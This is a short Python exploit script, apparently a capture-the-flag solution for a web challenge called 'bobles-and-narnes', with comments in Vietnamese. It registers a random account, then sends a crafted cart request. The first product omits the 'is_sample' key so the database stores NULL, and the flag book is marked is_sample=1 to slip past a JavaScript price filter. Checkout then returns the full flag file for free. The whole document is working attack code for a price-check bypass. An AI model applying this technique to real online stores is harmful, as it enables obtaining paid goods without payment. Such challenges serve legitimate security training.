import requests
import zipfile
import io
import random
import string

BASE = "https://bobles-and-narnes.chall.lac.tf"
s = requests.Session()

# 1. Register
username = "exploit_" + "".join(random.choices(string.ascii_lowercase, k=8))
s.post(f"{BASE}/register", data={"username": username, "password": "pw"})
print(f"[+] Registered: {username}")

# 2. Add flag book - bypass price check
# Object đầu tiên KHÔNG có key "is_sample"
# → Bun SQL bỏ qua cột is_sample trong INSERT
# → Tất cả row lưu is_sample = NULL
# Object thứ 2 (flag) có is_sample=1 → JS filter bỏ qua → miễn phí
s.post(f"{BASE}/cart/add", json={
    "products": [
        {"book_id": "a3e33c2505a19d18"},              # cheap book, NO is_sample key
        {"book_id": "2a16e349fb9045fa", "is_sample": 1} # flag book, is_sample=1 bypass price
    ]
})
print("[+] Added flag to cart (is_sample=NULL in DB)")

# 3. Checkout → NULL is falsy → serve flag.txt (full) thay vì flag_sample.txt
resp = s.post(f"{BASE}/cart/checkout")
z = zipfile.ZipFile(io.BytesIO(resp.content))
flag = z.read("flag.txt").decode()
print(f"[+] Flag: {flag}")
